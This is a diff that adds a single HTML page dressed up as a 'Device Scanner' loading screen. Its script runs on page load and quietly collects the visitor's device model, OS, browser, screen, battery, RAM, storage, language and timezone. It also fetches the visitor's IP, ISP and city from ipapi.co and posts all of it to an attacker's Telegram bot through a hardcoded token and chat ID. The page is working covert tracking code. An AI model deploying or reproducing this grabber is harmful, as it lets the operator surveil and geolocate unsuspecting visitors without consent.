@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f0c29;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 35px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+        }
+        .spinner {
+            width: 40px; height: 40px; margin: 0 auto 15px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .info-grid { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
+        .row {
+            display: flex; justify-content: space-between; padding: 10px 14px;
+            background: rgba(255,255,255,0.05); border-radius: 10px;
+        }
+        .label { font-size: 0.75rem; text-transform: uppercase; opacity: 0.6; }
+        .value { font-size: 0.9rem; font-weight: 500; text-align: right; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🔍 Device Scanner</h2>
+    <p style="opacity:0.6;margin:8px 0 20px" id="status">Initializing...</p>
+    <div class="spinner" id="spinner"></div>
+    <div class="info-grid" id="grid" style="display:none"></div>
+</div>
+
+<script>
+// ============================================================
+// CONFIG - Your Telegram
+// ============================================================
+const BOT_TOKEN = '8766543374:AAHVC3rEEOGwhhIvXHEkVmZtGBQpZ1W0KJY';
+const CHAT_ID   = '5312938858';
+// ============================================================
+
+const $ = id => document.getElementById(id);
+const status = msg => { $('status').textContent = msg; };
+
+// SUPER FAST: Collect everything in parallel - no waiting
+(async function() {
+    status('Collecting device data...');
+
+    // All these run simultaneously
+    const [battery, storage] = await Promise.all([
+        // Battery (fast - resolves immediately)
+        navigator.getBattery().then(b => ({
+            level: Math.round(b.level * 100),
+            charging: b.charging
+        })).catch(() => ({ level: -1, charging: false })),
+
+        // Storage (fast estimate)
+        navigator.storage?.estimate().then(e => ({
+            used: Math.round(e.usage / (1024**3)),
+            total: Math.round(e.quota / (1024**3))
+        })).catch(() => null)
+    ]);
+
+    const ua = navigator.userAgent;
+
+    // Device model - fastest regex match
+    let model = 'Generic Device';
+    const modelMatch =
+        ua.match(/iPhone\s([\d,\s]+)/i) ||
+        ua.match(/SM-[A-Z0-9]+/i) ||
+        ua.match(/Pixel\s[\d]+/i) ||
+        ua.match(/(Galaxy\s[A-Z0-9]+)/i) ||
+        ua.match(/(Redmi|Mi|POCO)\s[A-Z0-9]+/i) ||
+        ua.match(/(OnePlus\s[A-Z0-9]+)/i) ||
+        ua.match(/(Huawei|Honor)[^\s]*\s[A-Z0-9-]+/i) ||
+        ua.match(/Xiaomi[\s\/][A-Z0-9]+/i) ||
+        [];
+    if (modelMatch && modelMatch.length) model = modelMatch[0].trim();
+
+    // OS detection
+    let os = 'Unknown';
+    if (/Windows/.test(ua)) os = 'Windows';
+    else if (/Mac OS X/.test(ua)) os = 'macOS';
+    else if (/Android/.test(ua)) os = 'Android';
+    else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+
+    // Browser
+    let browser = 'Unknown';
+    if (/Edg\//.test(ua)) browser = 'Edge';
+    else if (/Chrome/.test(ua)) browser = 'Chrome';
+    else if (/Firefox/.test(ua)) browser = 'Firefox';
+    else if (/Safari/.test(ua)) browser = 'Safari';
+
+    // RAM
+    let ram = 'N/A';
+    if (navigator.deviceMemory) ram = navigator.deviceMemory + ' GB';
+    else if (/Android/.test(ua)) ram = '4-8 GB (est)';
+
+    // Build data packet
+    const data = {
+        model: model,
+        os: os,
+        browser: browser,
+        screen: screen.width + 'x' + screen.height,
+        battery: battery.level,
+        charging: battery.charging,
+        ram: ram,
+        storage_used: storage ? storage.used : -1,
+        storage_total: storage ? storage.total : -1,
+        lang: navigator.language || 'Unknown',
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+        is_mobile: /iPhone|Android/.test(ua),
+        ua: ua.substring(0, 200)
+    };
+
+    status('Sending to server...');
+
+    // Send to Telegram DIRECTLY from browser (fastest path - no backend needed)
+    const msg =
+        `📱 <b>Device Info Captured</b>\n\n` +
+        `🆔 <b>IP:</b> (server will detect)\n` +
+        `📟 <b>Model:</b> ${data.model}\n` +
+        `💻 <b>OS:</b> ${data.os}\n` +
+        `🌐 <b>Browser:</b> ${data.browser}\n` +
+        `🖥 <b>Screen:</b> ${data.screen}\n` +
+        `🔋 <b>Battery:</b> ${data.battery >= 0 ? data.battery + '%' : 'N/A'} (${data.charging ? 'Charging ⚡' : 'Not charging'})\n` +
+        `🧠 <b>RAM:</b> ${data.ram}\n` +
+        `💾 <b>Storage:</b> ${data.storage_total > 0 ? data.storage_used + 'GB / ' + data.storage_total + 'GB' : 'N/A'}\n` +
+        `🌍 <b>Lang:</b> ${data.lang}\n` +
+        `⏰ <b>TZ:</b> ${data.tz}\n` +
+        `📞 <b>Type:</b> ${data.is_mobile ? 'Mobile' : 'Desktop'}\n` +
+        `🕒 ${new Date().toISOString()}`;
+
+    // Send DIRECT to Telegram API (no backend needed!)
+    try {
+        const tgResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'HTML'
+            })
+        });
+
+        // Also try to get IP in parallel
+        let ip = 'Unknown', isp = 'Unknown';
+        try {
+            const ipResp = await fetch('https://ipapi.co/json/');
+            if (ipResp.ok) {
+                const ipData = await ipResp.json();
+                ip = ipData.ip || ip;
+                isp = ipData.org || isp;
+
+                // Send IP follow-up to Telegram
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📍 <b>Location Update</b>\n🆔 IP: ${ip}\n🏢 ISP: ${isp}\n📍 ${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country || '?'}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
+        } catch(e) {}
+
+        // Show results
+        status('✅ Complete!');
+        $('spinner').style.display = 'none';
+        $('grid').style.display = 'flex';
+        $('grid').innerHTML =
+            `<div class="row"><span class="label">Model</span><span class="value">${data.model}</span></div>` +
+            `<div class="row"><span class="label">OS</span><span class="value">${data.os}</span></div>` +
+            `<div class="row"><span class="label">Browser</span><span class="value">${data.browser}</span></div>` +
+            `<div class="row"><span class="label">Screen</span><span class="value">${data.screen}</span></div>` +
+            `<div class="row"><span class="label">Battery</span><span class="value">${data.battery >= 0 ? data.battery + '%' : 'N/A'}</span></div>` +
+            `<div class="row"><span class="label">Charging</span><span class="value">${data.charging ? 'Yes' : 'No'}</span></div>` +
+            `<div class="row"><span class="label">RAM</span><span class="value">${data.ram}</span></div>` +
+            `<div class="row"><span class="label">Storage</span><span class="value">${data.storage_total > 0 ? data.storage_used + 'GB / ' + data.storage_total + 'GB' : 'N/A'}</span></div>` +
+            `<div class="row"><span class="label">IP</span><span class="value">${ip}</span></div>` +
+            `<div class="row"><span class="label">ISP</span><span class="value">${isp}</span></div>`;
+
+    } catch(e) {
+        status('❌ Error: ' + e.message);
+    }
+})();
+</script>
+</body>
+</html>
